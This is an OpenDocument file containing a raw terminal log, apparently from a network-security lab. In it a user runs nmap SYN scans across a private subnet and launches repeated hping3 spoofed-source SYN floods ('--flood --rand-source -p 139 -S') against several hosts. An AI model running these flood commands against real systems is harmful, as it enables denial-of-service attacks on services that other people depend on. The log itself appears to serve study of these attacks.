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ministrator@ubuntu:~$ sudo apt-get install hping3</text:p>
      <text:p text:style-name="Standard">[sudo] password for administrator: </text:p>
      <text:p text:style-name="Standard">Reading package lists... Done</text:p>
      <text:p text:style-name="Standard">Building dependency tree <text:s text:c="6"/></text:p>
      <text:p text:style-name="Standard">Reading state information... Done</text:p>
      <text:p text:style-name="Standard">hping3 is already the newest version.</text:p>
      <text:p text:style-name="Standard">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo hping3 --flood --rand-source -p 139 -S 192.168.4.145</text:p>
      <text:p text:style-name="Standard">HPING 192.168.4.145 (eth1 192.168.4.145): S set, 40 headers + 0 data bytes</text:p>
      <text:p text:style-name="Standard">hping in flood mode, no replies will be shown</text:p>
      <text:p text:style-name="Standard">^C</text:p>
      <text:p text:style-name="Standard">--- 192.168.4.145 hping statistic ---</text:p>
      <text:p text:style-name="Standard">3251903 packets transmitted, 0 packets received, 100% packet loss</text:p>
      <text:p text:style-name="Standard">round-trip min/avg/max = 0.0/0.0/0.0 ms</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ </text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ nmap -sS 192.168.4.145</text:p>
      <text:p text:style-name="Standard">The program 'nmap' is currently not installed. <text:s/>You can install it by typing:</text:p>
      <text:p text:style-name="Standard">sudo apt-get install nmap</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo nmap -sS 192.168.4.145</text:p>
      <text:p text:style-name="Standard">[sudo] password for administrator: </text:p>
      <text:p text:style-name="Standard">sudo: nmap: command not found</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo apt-get nmap</text:p>
      <text:p text:style-name="Standard">E: Invalid operation nmap</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo apt-get install nmap</text:p>
      <text:p text:style-name="Standard">Reading package lists... Done</text:p>
      <text:p text:style-name="Standard">Building dependency tree <text:s text:c="6"/></text:p>
      <text:p text:style-name="Standard">Reading state information... Done</text:p>
      <text:p text:style-name="Standard">The following NEW packages will be installed:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/>nmap</text:p>
      <text:p text:style-name="Standard">0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.</text:p>
      <text:p text:style-name="Standard">Need to get 1,623 kB of archives.</text:p>
      <text:p text:style-name="Standard">After this operation, 6,876 kB of additional disk space will be used.</text:p>
      <text:p text:style-name="Standard">Get:1 http://us.archive.ubuntu.com/ubuntu/ precise/main nmap i386 5.21-1.1ubuntu1 [1,623 kB]</text:p>
      <text:p text:style-name="Standard">Fetched 1,623 kB in 7s (224 kB/s) <text:s text:c="45"/></text:p>
      <text:p text:style-name="Standard">Selecting previously unselected package nmap.</text:p>
      <text:p text:style-name="Standard">(Reading database ... 174491 files and directories currently installed.)</text:p>
      <text:p text:style-name="Standard">Unpacking nmap (from .../nmap_5.21-1.1ubuntu1_i386.deb) ...</text:p>
      <text:p text:style-name="Standard">Processing triggers for man-db ...</text:p>
      <text:p text:style-name="Standard">Setting up nmap (5.21-1.1ubuntu1) ...</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo nmap -sS 192.168.4.145</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Starting Nmap 5.21 ( http://nmap.org ) at 2013-04-25 06:25 EDT</text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.145</text:p>
      <text:p text:style-name="Standard">Host is up (0.00072s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 998 filtered ports</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>PORT <text:s text:c="3"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">139/tcp open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap done: 1 IP address (1 host up) scanned in 4.60 seconds</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo apt-get install hping3</text:p>
      <text:p text:style-name="Standard">[sudo] password for administrator: </text:p>
      <text:p text:style-name="Standard">Reading package lists... Done</text:p>
      <text:p text:style-name="Standard">Building dependency tree <text:s text:c="6"/></text:p>
      <text:p text:style-name="Standard">Reading state information... Done</text:p>
      <text:p text:style-name="Standard">hping3 is already the newest version.</text:p>
      <text:p text:style-name="Standard">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo hping3 --flood --rand-source -p 139 -S 192.168.4.145</text:p>
      <text:p text:style-name="Standard">HPING 192.168.4.145 (eth1 192.168.4.145): S set, 40 headers + 0 data bytes</text:p>
      <text:p text:style-name="Standard">hping in flood mode, no replies will be shown</text:p>
      <text:p text:style-name="Standard">^C</text:p>
      <text:p text:style-name="Standard">--- 192.168.4.145 hping statistic ---</text:p>
      <text:p text:style-name="Standard">3251903 packets transmitted, 0 packets received, 100% packet loss</text:p>
      <text:p text:style-name="Standard">round-trip min/avg/max = 0.0/0.0/0.0 ms</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo nmap 192.168.4.0/24</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Starting Nmap 5.21 ( http://nmap.org ) at 2013-04-25 06:32 EDT</text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.1</text:p>
      <text:p text:style-name="Standard">Host is up (0.00026s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 994 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">22/tcp <text:s text:c="2"/>open <text:s/>ssh</text:p>
      <text:p text:style-name="Standard">23/tcp <text:s text:c="2"/>open <text:s/>telnet</text:p>
      <text:p text:style-name="Standard">80/tcp <text:s text:c="2"/>open <text:s/>http</text:p>
      <text:p text:style-name="Standard">3128/tcp open <text:s/>squid-http</text:p>
      <text:p text:style-name="Standard">8090/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard">8443/tcp open <text:s/>https-alt</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.11</text:p>
      <text:p text:style-name="Standard">Host is up (0.00040s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 993 closed ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">135/tcp <text:s/>open <text:s/>msrpc</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">1031/tcp open <text:s/>iad2</text:p>
      <text:p text:style-name="Standard">1521/tcp open <text:s/>oracle</text:p>
      <text:p text:style-name="Standard">5560/tcp open <text:s/>isqlplus</text:p>
      <text:p text:style-name="Standard">8090/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.42</text:p>
      <text:p text:style-name="Standard">Host is up (0.00041s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 992 closed ports</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">80/tcp <text:s text:c="2"/>open <text:s/>http</text:p>
      <text:p text:style-name="Standard">135/tcp <text:s/>open <text:s/>msrpc</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">443/tcp <text:s/>open <text:s/>https</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">1521/tcp open <text:s/>oracle</text:p>
      <text:p text:style-name="Standard">5560/tcp open <text:s/>isqlplus</text:p>
      <text:p text:style-name="Standard">8090/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.48</text:p>
      <text:p text:style-name="Standard">Host is up (0.00068s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 989 closed ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">80/tcp <text:s text:c="2"/>open <text:s/>http</text:p>
      <text:p text:style-name="Standard">135/tcp <text:s/>open <text:s/>msrpc</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">443/tcp <text:s/>open <text:s/>https</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">1027/tcp open <text:s/>IIS</text:p>
      <text:p text:style-name="Standard">1043/tcp open <text:s/>boinc</text:p>
      <text:p text:style-name="Standard">1521/tcp open <text:s/>oracle</text:p>
      <text:p text:style-name="Standard">3389/tcp open <text:s/>ms-term-serv</text:p>
      <text:p text:style-name="Standard">5560/tcp open <text:s/>isqlplus</text:p>
      <text:p text:style-name="Standard">8090/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.99</text:p>
      <text:p text:style-name="Standard">Host is up (0.00065s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 973 closed ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">21/tcp <text:s text:c="2"/>open <text:s/>ftp</text:p>
      <text:p text:style-name="Standard">25/tcp <text:s text:c="2"/>open <text:s/>smtp</text:p>
      <text:p text:style-name="Standard">80/tcp <text:s text:c="2"/>open <text:s/>http</text:p>
      <text:p text:style-name="Standard">88/tcp <text:s text:c="2"/>open <text:s/>kerberos-sec</text:p>
      <text:p text:style-name="Standard">135/tcp <text:s/>open <text:s/>msrpc</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">389/tcp <text:s/>open <text:s/>ldap</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">464/tcp <text:s/>open <text:s/>kpasswd5</text:p>
      <text:p text:style-name="Standard">593/tcp <text:s/>open <text:s/>http-rpc-epmap</text:p>
      <text:p text:style-name="Standard">636/tcp <text:s/>open <text:s/>ldapssl</text:p>
      <text:p text:style-name="Standard">1025/tcp open <text:s/>NFS-or-IIS</text:p>
      <text:p text:style-name="Standard">1027/tcp open <text:s/>IIS</text:p>
      <text:p text:style-name="Standard">1041/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard">1050/tcp open <text:s/>java-or-OTGfileshare</text:p>
      <text:p text:style-name="Standard">1075/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard">1076/tcp open <text:s/>sns_credit</text:p>
      <text:p text:style-name="Standard">1083/tcp open <text:s/>ansoft-lm-1</text:p>
      <text:p text:style-name="Standard">1113/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>1433/tcp open <text:s/>ms-sql-s</text:p>
      <text:p text:style-name="Standard">1801/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard">2103/tcp open <text:s/>zephyr-clt</text:p>
      <text:p text:style-name="Standard">2105/tcp open <text:s/>eklogin</text:p>
      <text:p text:style-name="Standard">2107/tcp open <text:s/>unknown</text:p>
      <text:p text:style-name="Standard">3268/tcp open <text:s/>globalcatLDAP</text:p>
      <text:p text:style-name="Standard">3269/tcp open <text:s/>globalcatLDAPssl</text:p>
      <text:p text:style-name="Standard">3306/tcp open <text:s/>mysql</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.130</text:p>
      <text:p text:style-name="Standard">Host is up (0.00090s latency).</text:p>
      <text:p text:style-name="Standard">All 1000 scanned ports on 192.168.4.130 are closed</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.136</text:p>
      <text:p text:style-name="Standard">Host is up (0.00047s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 997 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">3389/tcp open <text:s/>ms-term-serv</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.143</text:p>
      <text:p text:style-name="Standard">Host is up (0.00083s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 998 closed ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="2"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">22/tcp open <text:s/>ssh</text:p>
      <text:p text:style-name="Standard">80/tcp open <text:s/>http</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.144</text:p>
      <text:p text:style-name="Standard">Host is up (0.00044s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 997 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">3389/tcp open <text:s/>ms-term-serv</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.145</text:p>
      <text:p text:style-name="Standard">Host is up (0.00048s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 998 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="3"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">139/tcp open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.148</text:p>
      <text:p text:style-name="Standard">Host is up (0.00044s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 997 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>3389/tcp open <text:s/>ms-term-serv</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.158</text:p>
      <text:p text:style-name="Standard">Host is up (0.00086s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 996 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">135/tcp <text:s/>open <text:s/>msrpc</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">3389/tcp open <text:s/>ms-term-serv</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.206</text:p>
      <text:p text:style-name="Standard">Host is up (0.00044s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 997 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE SERVICE</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">3389/tcp open <text:s/>ms-term-serv</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap scan report for 192.168.4.215</text:p>
      <text:p text:style-name="Standard">Host is up (0.00081s latency).</text:p>
      <text:p text:style-name="Standard">Not shown: 989 filtered ports</text:p>
      <text:p text:style-name="Standard">PORT <text:s text:c="4"/>STATE <text:s/>SERVICE</text:p>
      <text:p text:style-name="Standard">80/tcp <text:s text:c="2"/>open <text:s text:c="2"/>http</text:p>
      <text:p text:style-name="Standard">135/tcp <text:s/>open <text:s text:c="2"/>msrpc</text:p>
      <text:p text:style-name="Standard">139/tcp <text:s/>open <text:s text:c="2"/>netbios-ssn</text:p>
      <text:p text:style-name="Standard">143/tcp <text:s/>closed imap</text:p>
      <text:p text:style-name="Standard">144/tcp <text:s/>closed news</text:p>
      <text:p text:style-name="Standard">146/tcp <text:s/>closed iso-tp0</text:p>
      <text:p text:style-name="Standard">443/tcp <text:s/>open <text:s text:c="2"/>https</text:p>
      <text:p text:style-name="Standard">445/tcp <text:s/>open <text:s text:c="2"/>microsoft-ds</text:p>
      <text:p text:style-name="Standard">912/tcp <text:s/>open <text:s text:c="2"/>unknown</text:p>
      <text:p text:style-name="Standard">1043/tcp open <text:s text:c="2"/>boinc</text:p>
      <text:p text:style-name="Standard">1049/tcp closed unknown</text:p>
      <text:p text:style-name="Standard"></text:p>
      <text:p text:style-name="Standard">Nmap done: 256 IP addresses (14 hosts up) scanned in 55.44 seconds</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo hping3 --flood --rand-source -p 139 -S 192.168.4.144</text:p>
      <text:p text:style-name="Standard">HPING 192.168.4.144 (eth1 192.168.4.144): S set, 40 headers + 0 data bytes</text:p>
      <text:p text:style-name="Standard">hping in flood mode, no replies will be shown</text:p>
      <text:p text:style-name="Standard">^C</text:p>
      <text:p text:style-name="Standard">--- 192.168.4.144 hping statistic ---</text:p>
      <text:p text:style-name="Standard">3189544 packets transmitted, 0 packets received, 100% packet loss</text:p>
      <text:p text:style-name="Standard">round-trip min/avg/max = 0.0/0.0/0.0 ms</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo hping3 --flood --rand-source -p 139 -S 192.168.4.144</text:p>
      <text:p text:style-name="Standard">HPING 192.168.4.144 (eth1 192.168.4.144): S set, 40 headers + 0 data bytes</text:p>
      <text:p text:style-name="Standard">hping in flood mode, no replies will be shown</text:p>
      <text:p text:style-name="Standard">^C</text:p>
      <text:p text:style-name="Standard">--- 192.168.4.144 hping statistic ---</text:p>
      <text:p text:style-name="Standard">1396732 packets transmitted, 0 packets received, 100% packet loss</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>round-trip min/avg/max = 0.0/0.0/0.0 ms</text:p>
      <text:p text:style-name="Standard">administrator@ubuntu:~$ sudo hping3 --flood --rand-source -p 139 -S 192.168.4.14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06:30:43</meta:creation-date>
    <dc:date>2013-04-25T06:35:58</dc:date>
    <meta:editing-duration>PT4M4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6" meta:paragraph-count="243" meta:word-count="1037" meta:character-count="7580" meta:non-whitespace-character-count="6256"/>
  </office:meta>
</office:document-meta>
</file>